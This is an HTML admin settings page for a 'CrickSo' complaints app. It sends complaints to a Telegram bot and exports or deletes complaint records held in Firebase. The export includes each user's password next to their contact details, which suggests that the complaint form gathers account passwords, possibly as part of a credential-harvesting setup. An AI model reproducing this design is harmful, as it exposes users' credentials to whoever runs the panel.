<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="theme-color" content="#ffffff">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <title>CrickSo Admin - Settings</title>
    <link rel="stylesheet" href="style.css">
    <link rel="manifest" href="manifest.json">
    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
</head>
<body>
    <header class="header">
        <div class="header-top">
            <div class="logo">
                <svg viewBox="0 0 32 32" fill="none">
                    <rect width="32" height="32" rx="8" fill="#2563eb"/>
                    <path d="M8 16c0-4.418 3.582-8 8-8s8 3.582 8 8-3.582 8-8 8" stroke="#fff" stroke-width="2.5" stroke-linecap="round"/>
                    <circle cx="16" cy="16" r="3" fill="#fff"/>
                </svg>
                <div>
                    <div class="logo-text">CrickSo Admin</div>
                    <div class="logo-sub">Settings</div>
                </div>
            </div>
        </div>
    </header>

    <div class="main">
        <div class="settings-section">
            <div class="settings-section-title">Telegram Bot</div>
            <div class="settings-group">
                <div class="settings-item" style="flex-direction:column;align-items:stretch;gap:12px;">
                    <div class="settings-item-left">
                        <div class="settings-icon settings-icon-blue">
                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"/></svg>
                        </div>
                        <div>
                            <div class="settings-text">Telegram Configuration</div>
                            <div class="settings-subtext">Send complaints to Telegram channel</div>
                        </div>
                    </div>
                    <div style="display:flex;flex-direction:column;gap:10px;">
                        <div>
                            <label style="font-size:11px;font-weight:600;color:#64748b;display:block;margin-bottom:4px;">Bot Token</label>
                            <input type="text" id="telegramBotToken" class="settings-input" placeholder="Enter bot token">
                        </div>
                        <div>
                            <label style="font-size:11px;font-weight:600;color:#64748b;display:block;margin-bottom:4px;">Chat ID</label>
                            <input type="text" id="telegramChatId" class="settings-input" placeholder="Enter chat ID">
                        </div>
                        <div style="display:flex;gap:8px;">
                            <button class="btn btn-primary" onclick="saveTelegramConfig()" style="flex:1;">Save</button>
                            <button class="btn btn-outline" onclick="testTelegram()" style="flex:1;">Test</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="settings-section">
            <div class="settings-section-title">General</div>
            <div class="settings-group">
                <div class="settings-item">
                    <div class="settings-item-left">
                        <div class="settings-icon settings-icon-green">
                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
                        </div>
                        <div>
                            <div class="settings-text">Auto Approve</div>
                            <div class="settings-subtext">Auto-approve complaints</div>
                        </div>
                    </div>
                    <label class="toggle">
                        <input type="checkbox" id="autoApproveToggle" onchange="saveSetting('autoApprove', this.checked)">
                        <span class="toggle-slider"></span>
                    </label>
                </div>
            </div>
        </div>

        <div class="settings-section">
            <div class="settings-section-title">Data</div>
            <div class="settings-group">
                <div class="settings-item" onclick="exportData()" style="cursor:pointer;">
                    <div class="settings-item-left">
                        <div class="settings-icon settings-icon-teal">
                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
                        </div>
                        <div>
                            <div class="settings-text">Export Data</div>
                            <div class="settings-subtext">Download complaints CSV</div>
                        </div>
                    </div>
                    <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="#64748b" stroke-width="2"><path d="M9 18l6-6-6-6"/></svg>
                </div>
                <div class="settings-item" onclick="clearAllData()" style="cursor:pointer;">
                    <div class="settings-item-left">
                        <div class="settings-icon settings-icon-red">
                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 01-2 2H7a2 2 0 01-2-2V6m3 0V4a2 2 0 012-2h4a2 2 0 012 2v2"/></svg>
                        </div>
                        <div>
                            <div class="settings-text">Clear All Data</div>
                            <div class="settings-subtext">Delete all complaints</div>
                        </div>
                    </div>
                    <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="#64748b" stroke-width="2"><path d="M9 18l6-6-6-6"/></svg>
                </div>
            </div>
        </div>

        <div class="settings-section">
            <div class="settings-section-title">About</div>
            <div class="settings-group">
                <div class="settings-item">
                    <div class="settings-item-left">
                        <div class="settings-icon settings-icon-purple">
                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4"/><path d="M12 8h.01"/></svg>
                        </div>
                        <div>
                            <div class="settings-text">Version</div>
                            <div class="settings-subtext">Current app version</div>
                        </div>
                    </div>
                    <span class="settings-value">2.0.0</span>
                </div>
            </div>
        </div>
    </div>

    <div class="modal-overlay" id="confirmModal">
        <div class="modal">
            <div class="modal-handle"></div>
            <div class="modal-header">
                <span class="modal-title">Confirm</span>
                <button class="modal-close" onclick="document.getElementById('confirmModal').classList.remove('active')">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 6L6 18M6 6l12 12"/></svg>
                </button>
            </div>
            <div class="modal-body" id="confirmBody"></div>
            <div class="modal-footer" id="confirmFooter"></div>
        </div>
    </div>

    <div class="toast" id="toast"></div>

    <nav class="bottom-nav">
        <a href="index.html" class="nav-item">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
            <span>Home</span>
        </a>
        <a href="complaints.html" class="nav-item">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2"/></svg>
            <span>Complaints</span>
        </a>
        <a href="users.html" class="nav-item">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 21v-2a4 4 0 00-4-4H5a4 4 0 00-4 4v2"/><circle cx="9" cy="7" r="4"/></svg>
            <span>Users</span>
        </a>
        <a href="settings.html" class="nav-item active">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 00.33 1.82l.06.06a2 2 0 01-2.83 2.83l-.06-.06a1.65 1.65 0 00-1.82-.33 1.65 1.65 0 00-1 1.51V21a2 2 0 01-4 0v-.09A1.65 1.65 0 009 19.4a1.65 1.65 0 00-1.82.33l-.06.06a2 2 0 01-2.83-2.83l.06-.06A1.65 1.65 0 004.68 15a1.65 1.65 0 00-1.51-1H3a2 2 0 010-4h.09A1.65 1.65 0 004.6 9a1.65 1.65 0 00-.33-1.82l-.06-.06a2 2 0 012.83-2.83l.06.06A1.65 1.65 0 009 4.68a1.65 1.65 0 001-1.51V3a2 2 0 014 0v.09a1.65 1.65 0 001 1.51 1.65 1.65 0 001.82-.33l.06-.06a2 2 0 012.83 2.83l-.06.06A1.65 1.65 0 0019.4 9a1.65 1.65 0 001.51 1H21a2 2 0 010 4h-.09a1.65 1.65 0 00-1.51 1z"/></svg>
            <span>Settings</span>
        </a>
    </nav>

    <script src="app.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            loadSettings();
        });

        function loadSettings() {
            var saved = JSON.parse(localStorage.getItem('crickso_admin_settings') || '{}');
            if (saved.telegramBotToken) document.getElementById('telegramBotToken').value = saved.telegramBotToken;
            if (saved.telegramChatId) document.getElementById('telegramChatId').value = saved.telegramChatId;
            if (saved.autoApprove !== undefined) document.getElementById('autoApproveToggle').checked = saved.autoApprove;
        }

        function saveSetting(key, value) {
            var settings = JSON.parse(localStorage.getItem('crickso_admin_settings') || '{}');
            settings[key] = value;
            localStorage.setItem('crickso_admin_settings', JSON.stringify(settings));
            showToast('Setting saved', 'success');
        }

        function saveTelegramConfig() {
            var token = document.getElementById('telegramBotToken').value.trim();
            var chatId = document.getElementById('telegramChatId').value.trim();
            if (!token || !chatId) { showToast('Fill both fields', 'error'); return; }
            saveSetting('telegramBotToken', token);
            saveSetting('telegramChatId', chatId);
            showToast('Config saved', 'success');
        }

        function testTelegram() {
            var token = document.getElementById('telegramBotToken').value.trim();
            var chatId = document.getElementById('telegramChatId').value.trim();
            if (!token || !chatId) { showToast('Save config first', 'error'); return; }
            fetch('https://api.telegram.org/bot' + token + '/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: '*Test Message*\n\nCrickSo Admin connected!', parse_mode: 'Markdown' })
            }).then(function(r) { return r.json(); }).then(function(data) {
                if (data.ok) showToast('Test sent!', 'success');
                else showToast('Failed: ' + (data.description || 'Error'), 'error');
            }).catch(function() { showToast('Network error', 'error'); });
        }

        function exportData() {
            getComplaintsFromFirebase().then(function(complaints) {
                if (complaints.length === 0) { showToast('No data', 'info'); return; }
                var csv = 'ID,Name,Mobile,Email,Password,Type,ProblemType,Amount,Subject,Message,Status,Date\n' + complaints.map(function(c) {
                    return [c.id, c.name||'', c.mobile||c.phone||'', c.email||'', c.password||'', c.type||'', c.problemType||'', c.amount||'', c.subject||'', c.message||'', c.status||'', c.createdAt||''].map(function(f) { return '"' + String(f).replace(/"/g,'""') + '"'; }).join(',');
                }).join('\n');
                var blob = new Blob([csv], { type: 'text/csv' });
                var a = document.createElement('a');
                a.href = URL.createObjectURL(blob);
                a.download = 'crickso_' + new Date().toISOString().slice(0,10) + '.csv';
                a.click();
                showToast('Exported', 'success');
            });
        }

        function clearAllData() {
            document.getElementById('confirmBody').innerHTML = '<p style="text-align:center;color:#64748b;">Delete all complaints?</p>';
            document.getElementById('confirmFooter').innerHTML = '<button class="btn btn-outline" onclick="document.getElementById(\'confirmModal\').classList.remove(\'active\')">Cancel</button><button class="btn btn-danger" onclick="executeClear()">Delete</button>';
            document.getElementById('confirmModal').classList.add('active');
        }

        function executeClear() {
            getComplaintsFromFirebase().then(function(complaints) {
                return Promise.all(complaints.map(function(c) { return deleteComplaintFromFirebase(c.id); }));
            }).then(function() {
                showToast('All deleted', 'success');
                document.getElementById('confirmModal').classList.remove('active');
            });
        }
    </script>
</body>
</html>
